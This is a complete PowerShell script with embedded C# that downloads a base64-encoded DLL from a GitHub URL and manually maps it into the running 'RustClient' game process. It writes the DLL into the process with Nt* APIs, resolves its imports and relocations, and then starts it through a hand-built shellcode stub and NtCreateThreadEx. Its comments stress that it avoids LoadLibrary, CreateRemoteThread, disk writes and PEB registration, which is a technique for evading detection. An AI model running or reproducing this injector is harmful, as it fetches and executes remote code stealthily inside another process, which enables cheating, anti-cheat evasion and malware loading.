<#
    Manual PE Mapping v2 для RustClient.
    НЕ использует ReflectiveLoader. НЕ пишет DLL на диск.
    НЕ вызывает LoadLibraryA/CreateRemoteThread. НЕ регистрирует модуль в PEB.
    Только Nt* API + ручной парсинг PE.
#>

$ErrorActionPreference = 'Stop'

$MapperCode = @"
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;

public static class ManualMapper
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr LoadLibraryA(string name);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string name);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, IntPtr ordinal);

    [DllImport("ntdll.dll")]
    public static extern uint NtAllocateVirtualMemory(IntPtr h, ref IntPtr addr, IntPtr zero, ref UIntPtr size, uint allocType, uint prot);
    [DllImport("ntdll.dll")]
    public static extern uint NtWriteVirtualMemory(IntPtr h, IntPtr addr, byte[] buf, UIntPtr size, out UIntPtr written);
    [DllImport("ntdll.dll")]
    public static extern uint NtProtectVirtualMemory(IntPtr h, ref IntPtr addr, ref UIntPtr size, uint newProt, out uint oldProt);
    [DllImport("ntdll.dll")]
    public static extern uint NtCreateThreadEx(out IntPtr hThread, uint access, IntPtr objAttr, IntPtr hProcess, IntPtr start, IntPtr arg, bool suspended, uint zeroBits, uint stackCommit, uint stackReserve, IntPtr attrList);

    private const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    private const uint MEM_COMMIT = 0x1000;
    private const uint MEM_RESERVE = 0x2000;
    private const uint PAGE_READWRITE = 0x04;
    private const uint PAGE_READONLY = 0x02;
    private const uint PAGE_EXECUTE_READ = 0x20;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;
    private const uint PAGE_EXECUTE_WRITECOPY = 0x80;
    private const uint THREAD_ALL_ACCESS = 0x1F03FF;
    private const uint SCN_MEM_EXECUTE = 0x20000000;
    private const uint SCN_MEM_WRITE = 0x80000000;

    private static uint R32(byte[] b, int o) { return BitConverter.ToUInt32(b, o); }
    private static ushort R16(byte[] b, int o) { return BitConverter.ToUInt16(b, o); }

    public static void Inject(int pid, byte[] dllBytes)
    {
        Console.WriteLine("[mapper] Size: " + dllBytes.Length + " bytes");
        if (dllBytes.Length < 0x40) throw new Exception("PE too small");
        int e_lfanew = BitConverter.ToInt32(dllBytes, 0x3C);
        if (R32(dllBytes, e_lfanew) != 0x00004550) throw new Exception("Bad PE signature");
        ushort machine = R16(dllBytes, e_lfanew + 4);
        Console.WriteLine("[mapper] Machine: 0x" + machine.ToString("X"));
        if (machine != 0x8664) throw new Exception("Not x64 (machine=0x" + machine.ToString("X") + "). RustClient is x64.");

        ushort numSections = R16(dllBytes, e_lfanew + 6);
        ushort optHeaderSize = R16(dllBytes, e_lfanew + 20);
        int optOff = e_lfanew + 24;
        if (R16(dllBytes, optOff) != 0x20B) throw new Exception("Not PE32+");

        ulong preferredBase = BitConverter.ToUInt64(dllBytes, optOff + 24);
        uint sizeOfImage = R32(dllBytes, optOff + 56);
        uint sizeOfHeaders = R32(dllBytes, optOff + 60);
        uint entryPoint = R32(dllBytes, optOff + 16);

        Console.WriteLine("[mapper] PreferredBase: 0x" + preferredBase.ToString("X"));
        Console.WriteLine("[mapper] SizeOfImage: 0x" + sizeOfImage.ToString("X"));
        Console.WriteLine("[mapper] EntryPoint RVA: 0x" + entryPoint.ToString("X"));
        Console.WriteLine("[mapper] Sections: " + numSections);

        // .NET / CLR check
        int ddOff = optOff + 112;
        uint clrRVA = R32(dllBytes, ddOff + 14 * 8);
        if (clrRVA != 0) throw new Exception("DLL is managed (.NET/CLR). Manual mapping is not supported for it.");

        uint importRVA = R32(dllBytes, ddOff + 1 * 8);
        uint relocRVA = R32(dllBytes, ddOff + 5 * 8);
        uint relocSize = R32(dllBytes, ddOff + 5 * 8 + 4);
        uint tlsRVA = R32(dllBytes, ddOff + 9 * 8);

        int sectOff = optOff + optHeaderSize;
        var sections = new List<uint[]>();
        for (int i = 0; i < numSections; i++)
        {
            int o = sectOff + i * 40;
            sections.Add(new uint[] {
                R32(dllBytes, o + 12), R32(dllBytes, o + 8),
                R32(dllBytes, o + 20), R32(dllBytes, o + 16),
                R32(dllBytes, o + 36)
            });
        }

        Func<uint, int> rvaToOff = (rva) =>
        {
            foreach (var s in sections)
                if (rva >= s[0] && rva < s[0] + s[1])
                    return (int)(s[2] + (rva - s[0]));
            return -1;
        };

        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
        if (hProcess == IntPtr.Zero) throw new Exception("OpenProcess: " + Marshal.GetLastWin32Error());

        try
        {
            IntPtr remoteBase = IntPtr.Zero;
            UIntPtr allocSize = (UIntPtr)sizeOfImage;
            uint st = NtAllocateVirtualMemory(hProcess, ref remoteBase, IntPtr.Zero, ref allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (st != 0) throw new Exception("NtAllocateVirtualMemory: 0x" + st.ToString("X"));
            Console.WriteLine("[mapper] RemoteBase: 0x" + remoteBase.ToInt64().ToString("X"));

            ulong delta = (ulong)remoteBase.ToInt64() - preferredBase;

            // Relocations
            if (delta != 0)
            {
                if (relocRVA == 0 || relocSize == 0)
                    throw new Exception("DLL has no reloc table but landed at different base. Rebuild VS project with /DYNAMICBASE.");
                int p = rvaToOff(relocRVA);
                if (p < 0) throw new Exception("Bad reloc RVA");
                int endOff = p + (int)relocSize;
                while (p < endOff)
                {
                    uint pageRVA = R32(dllBytes, p);
                    uint blockSize = R32(dllBytes, p + 4);
                    if (blockSize < 8) break;
                    int n = (int)((blockSize - 8) / 2);
                    for (int i = 0; i < n; i++)
                    {
                        ushort e = BitConverter.ToUInt16(dllBytes, p + 8 + i * 2);
                        int type = e >> 12;
                        int off = e & 0xFFF;
                        if (type == 0) continue;
                        int po = rvaToOff(pageRVA + (uint)off);
                        if (po < 0) continue;
                        if (type == 10)
                        {
                            ulong v = BitConverter.ToUInt64(dllBytes, po) + delta;
                            Array.Copy(BitConverter.GetBytes(v), 0, dllBytes, po, 8);
                        }
                        else if (type == 3)
                        {
                            uint v = R32(dllBytes, po) + (uint)delta;
                            Array.Copy(BitConverter.GetBytes(v), 0, dllBytes, po, 4);
                        }
                    }
                    p += (int)blockSize;
                }
            }

            // Imports
            if (importRVA != 0)
            {
                int impOff = rvaToOff(importRVA);
                int i = 0;
                while (true)
                {
                    int descOff = impOff + i * 20;
                    uint originalFirstThunk = R32(dllBytes, descOff);
                    uint nameRVA = R32(dllBytes, descOff + 12);
                    uint firstThunk = R32(dllBytes, descOff + 16);
                    if (nameRVA == 0) break;

                    int nameOff = rvaToOff(nameRVA);
                    StringBuilder sb = new StringBuilder();
                    while (dllBytes[nameOff] != 0) sb.Append((char)dllBytes[nameOff++]);
                    string dllName = sb.ToString();
                    Console.WriteLine("[mapper] Import: " + dllName);

                    IntPtr hMod = LoadLibraryA(dllName);
                    if (hMod == IntPtr.Zero)
                        throw new Exception("Cannot resolve dependency: " + dllName + ". Is it installed on target machine?");

                    uint thunkRVA = originalFirstThunk != 0 ? originalFirstThunk : firstThunk;
                    int thunkOff = rvaToOff(thunkRVA);
                    int iatOff = rvaToOff(firstThunk);
                    int j = 0;
                    while (true)
                    {
                        ulong val = BitConverter.ToUInt64(dllBytes, thunkOff + j * 8);
                        if (val == 0) break;
                        IntPtr funcAddr;
                        if ((val & 0x8000000000000000UL) != 0)
                            funcAddr = GetProcAddress(hMod, (IntPtr)(val & 0xFFFF));
                        else
                        {
                            int hnOff = rvaToOff((uint)val);
                            int nameStart = hnOff + 2;
                            StringBuilder fn = new StringBuilder();
                            while (dllBytes[nameStart] != 0) fn.Append((char)dllBytes[nameStart++]);
                            funcAddr = GetProcAddress(hMod, fn.ToString());
                        }
                        if (funcAddr == IntPtr.Zero)
                            throw new Exception("GetProcAddress failed: " + dllName);
                        Array.Copy(BitConverter.GetBytes((ulong)funcAddr.ToInt64()), 0, dllBytes, iatOff + j * 8, 8);
                        j++;
                    }
                    i++;
                }
            }

            // TLS callbacks (VAs after relocation)
            var tlsCallbacks = new List<ulong>();
            if (tlsRVA != 0)
            {
                int tlsOff = rvaToOff(tlsRVA);
                ulong callbacksVA = BitConverter.ToUInt64(dllBytes, tlsOff + 24);
                if (callbacksVA != 0)
                {
                    int k = 0;
                    while (true)
                    {
                        int cbOffInBuf = (int)(callbacksVA - (ulong)remoteBase.ToInt64()) + k * 8;
                        if (cbOffInBuf < 0 || cbOffInBuf + 8 > dllBytes.Length) break;
                        ulong cbVA = BitConverter.ToUInt64(dllBytes, cbOffInBuf);
                        if (cbVA == 0) break;
                        tlsCallbacks.Add(cbVA);
                        k++;
                    }
                    Console.WriteLine("[mapper] TLS callbacks: " + tlsCallbacks.Count);
                }
            }

            // Write headers
            byte[] hdr = new byte[sizeOfHeaders];
            Array.Copy(dllBytes, 0, hdr, 0, (int)sizeOfHeaders);
            UIntPtr written;
            st = NtWriteVirtualMemory(hProcess, remoteBase, hdr, (UIntPtr)sizeOfHeaders, out written);
            if (st != 0) throw new Exception("WriteHeaders: 0x" + st.ToString("X"));

            // Write sections
            foreach (var s in sections)
            {
                uint copySize = Math.Min(s[1], s[3]);
                if (copySize == 0) continue;
                byte[] sec = new byte[copySize];
                Array.Copy(dllBytes, (int)s[2], sec, 0, (int)copySize);
                IntPtr dst = IntPtr.Add(remoteBase, (int)s[0]);
                st = NtWriteVirtualMemory(hProcess, dst, sec, (UIntPtr)copySize, out written);
                if (st != 0) throw new Exception("WriteSection: 0x" + st.ToString("X"));
            }

            // Apply protections
            foreach (var s in sections)
            {
                if (s[1] == 0) continue;
                uint prot = PAGE_READONLY;
                bool exe = (s[4] & SCN_MEM_EXECUTE) != 0;
                bool wr = (s[4] & SCN_MEM_WRITE) != 0;
                if (exe && wr) prot = PAGE_EXECUTE_READWRITE;
                else if (exe) prot = PAGE_EXECUTE_READ;
                else if (wr) prot = PAGE_READWRITE;
                IntPtr sa = IntPtr.Add(remoteBase, (int)s[0]);
                UIntPtr ss = (UIntPtr)s[1];
                uint old;
                NtProtectVirtualMemory(hProcess, ref sa, ref ss, prot, out old);
            }

            // Build stub: TLS callbacks -> DllMain
            ulong dllMainAddr = (ulong)remoteBase.ToInt64() + entryPoint;
            ulong baseVal = (ulong)remoteBase.ToInt64();
            byte[] sc;
            using (var ms = new MemoryStream())
            {
                var w = new BinaryWriter(ms);
                foreach (var cb in tlsCallbacks)
                {
                    w.Write(new byte[] { 0x48, 0xB9 }); w.Write(baseVal);
                    w.Write(new byte[] { 0x48, 0xBA }); w.Write((ulong)1);
                    w.Write(new byte[] { 0x4D, 0x31, 0xC0 });
                    w.Write(new byte[] { 0x48, 0xB8 }); w.Write(cb);
                    w.Write(new byte[] { 0x48, 0x83, 0xEC, 0x28 });
                    w.Write(new byte[] { 0xFF, 0xD0 });
                    w.Write(new byte[] { 0x48, 0x83, 0xC4, 0x28 });
                }
                // DllMain(base, DLL_PROCESS_ATTACH, NULL)
                w.Write(new byte[] { 0x48, 0xB9 }); w.Write(baseVal);
                w.Write(new byte[] { 0x48, 0xBA }); w.Write((ulong)1);
                w.Write(new byte[] { 0x4D, 0x31, 0xC0 });
                w.Write(new byte[] { 0x48, 0xB8 }); w.Write(dllMainAddr);
                w.Write(new byte[] { 0x48, 0x83, 0xEC, 0x28 });
                w.Write(new byte[] { 0xFF, 0xD0 });
                w.Write(new byte[] { 0x48, 0x83, 0xC4, 0x28 });
                w.Write((byte)0xC3);
                w.Flush();
                sc = ms.ToArray();
            }

            IntPtr scAddr = IntPtr.Zero;
            UIntPtr scSize = (UIntPtr)sc.Length;
            st = NtAllocateVirtualMemory(hProcess, ref scAddr, IntPtr.Zero, ref scSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (st != 0) throw new Exception("AllocSC: 0x" + st.ToString("X"));
            st = NtWriteVirtualMemory(hProcess, scAddr, sc, (UIntPtr)sc.Length, out written);
            if (st != 0) throw new Exception("WriteSC: 0x" + st.ToString("X"));
            Console.WriteLine("[mapper] Stub at 0x" + scAddr.ToInt64().ToString("X") + " (" + sc.Length + " bytes)");

            IntPtr hThread;
            st = NtCreateThreadEx(out hThread, THREAD_ALL_ACCESS, IntPtr.Zero, hProcess, scAddr, IntPtr.Zero, false, 0, 0x1000, 0x100000, IntPtr.Zero);
            if (st != 0) throw new Exception("NtCreateThreadEx: 0x" + st.ToString("X"));
            CloseHandle(hThread);
            Console.WriteLine("[mapper] Thread started.");
        }
        finally
        {
            CloseHandle(hProcess);
        }
    }
}
"@

if (-not ([System.Management.Automation.PSTypeName]'ManualMapper').Type) {
    Add-Type -TypeDefinition $MapperCode -Language CSharp
}

$Url = "https://raw.githubusercontent.com/PUZAN1337/-/refs/heads/main/svin.dll"
$TargetProcessName = "RustClient"

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) { Write-Host "[!] Need admin." -ForegroundColor Red; return }

try {
    $base64String = Invoke-RestMethod -Uri $Url -UseBasicParsing -ErrorAction Stop
    $base64String = ($base64String -replace '\s', '')
    Write-Host "[+] Base64 length: $($base64String.Length)" -ForegroundColor Green
    $dllBytes = [System.Convert]::FromBase64String($base64String)
} catch {
    Write-Error "Download/decode: $($_.Exception.Message)"; return
}
if ($dllBytes[0] -ne 0x4D -or $dllBytes[1] -ne 0x5A) { Write-Warning "No MZ header."; return }

$targetProcess = Get-Process -Name $TargetProcessName -ErrorAction SilentlyContinue | Select-Object -First 1
if (-not $targetProcess) {
    Write-Host "[!] '$TargetProcessName' not found." -ForegroundColor Yellow
    Get-Process | Where-Object { $_.ProcessName -like '*rust*' } | Format-Table Id, ProcessName, Path -AutoSize
    return
}
Write-Host "[+] Target: $($targetProcess.ProcessName) (PID $($targetProcess.Id))" -ForegroundColor Cyan

try {
    [ManualMapper]::Inject($targetProcess.Id, $dllBytes)
    Write-Host "[+] Manual mapping OK." -ForegroundColor Green
} catch {
    Write-Host "[!] Injection failed: $($_.Exception.Message)" -ForegroundColor Red
}
